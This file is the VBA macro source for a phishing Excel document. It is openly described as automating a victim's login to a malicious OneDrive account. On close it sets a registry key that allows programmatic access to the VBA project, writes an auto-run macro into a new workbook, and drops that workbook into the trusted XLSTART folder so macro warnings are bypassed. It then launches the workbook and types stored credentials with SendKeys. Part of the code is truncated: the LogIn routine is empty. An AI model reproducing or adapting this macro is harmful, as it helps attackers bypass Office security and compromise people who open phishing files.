'This is the code for the phishing document that automates logging into the malicious Onedrive account 

Private Declare PtrSafe Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare PtrSafe Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare PtrSafe Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare PtrSafe Function GetWindow Lib "user32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long
Private Declare PtrSafe Function IsWindowVisible Lib "user32" (ByVal hWnd As Long) As Boolean
Private Declare PtrSafe Function SetForegroundWindow Lib "user32" (ByVal hWnd As LongPtr) As LongPtr
Private Const GW_HWNDNEXT = 2

Private Sub Focus()
'Function to bring excel to the forefront and use Send Keys to log in to the document request
    Dim lhWndP As Long
    'For some reason the log in window isn't consistent so check for which one is being used
    If GetHandleFromPartialCaption(lhWndP, "Connect") = True Then
        SetForegroundWindow lhWndP
        SendKeys "<username>"
        SendKeys "{Tab}"
        SendKeys "<password>"
        SendKeys "{ENTER}"
    ElseIf GetHandleFromPartialCaption(lhWndP, "Excel") = True Then
        SetForegroundWindow lhWndP
        SendKeys "<username>"
        SendKeys "{ENTER}"
        Wait (10)
        SendKeys "<password>"
        SendKeys "{ENTER}"
    Else
        MsgBox "Window 'Excel' not found!", vbOKOnly + vbExclamation
    End If

End Sub

Private Sub LogIn()
	

Private Function GetHandleFromPartialCaption(ByRef lWnd As Long, ByVal sCaption As String) As Boolean

    Dim lhWndP As Long
    Dim sStr As String
    GetHandleFromPartialCaption = False
    lhWndP = FindWindow(vbNullString, vbNullString) 'PARENT WINDOW
    Do While lhWndP <> 0
        sStr = String(GetWindowTextLength(lhWndP) + 1, Chr$(0))
        GetWindowText lhWndP, sStr, Len(sStr)
        sStr = Left$(sStr, Len(sStr) - 1)
        If InStr(1, sStr, sCaption) > 0 Then
            GetHandleFromPartialCaption = True
            lWnd = lhWndP
            Exit Do
        End If
        lhWndP = GetWindow(lhWndP, GW_HWNDNEXT)
    Loop

End Function

Sub AutoClose()
'
' AutoClose Macro
'
'
    'Modify Registry Key to allow the psuedo reflection
    Ver = Application.Version
    CreateObject("WScript.Shell").RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\" & Ver & "\Excel\Security\AccessVBOM", 1, "REG_DWORD"
    
    'Build an Excel Doc that will attempt to pull down the Entangled Excel file
    'This is neccessary because the victim will not have permissions to access the Entangled file yet
    'And the login prompt will block execution from the phishing doc if not in another process
    Set ExcelApp = CreateObject("Excel.Application")
    ExcelApp.Visible = True
    ExcelApp.Workbooks.Add
    'Requires reference to Microsoft Visual Basic for Applications Extensibility
    With ExcelApp.ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    cLines = .CountOfLines + 1
        .InsertLines cLines, _
            "Sub WorkBook_Open" & Chr(13) & _
                "   Workbooks.Open ""<onedrive link>""" & Chr(13) & _
            "End Sub"
    End With
    '%AppData%\Microsoft\Excel\XLSTART\ is a trusted file location so when we launch the dropped file we don't have to worry about
    'needing to enable macros
    
    strFolder = Environ("AppData") & "\Microsoft\Excel\XLSTART"
    strName = strFolder & "\malBook2.xlsm"
    
    'The file is always listed as a trusted location but sometimes the file doesn't exist
    'Needs reference to Microsoft Scripting Runtime
    Dim fso As New FileSystemObject
    
    If Not fso.FolderExists(strFolder) Then
        fso.CreateFolder strFolder
    End If
    
    ExcelApp.ActiveWorkbook.SaveAs strName, FileFormat:=52
    ExcelApp.Quit
                
    'Launch the dropped excel file to intiate the login request
    Shell "excel.exe """ & strName & """", 1
    Wait (5)
    LogIn
    

End Sub

Sub Wait(n As Integer)
     Dim t As Date
        t = Now
        Do
            DoEvents
        Loop Until Now >= DateAdd("s", n, t)
End Sub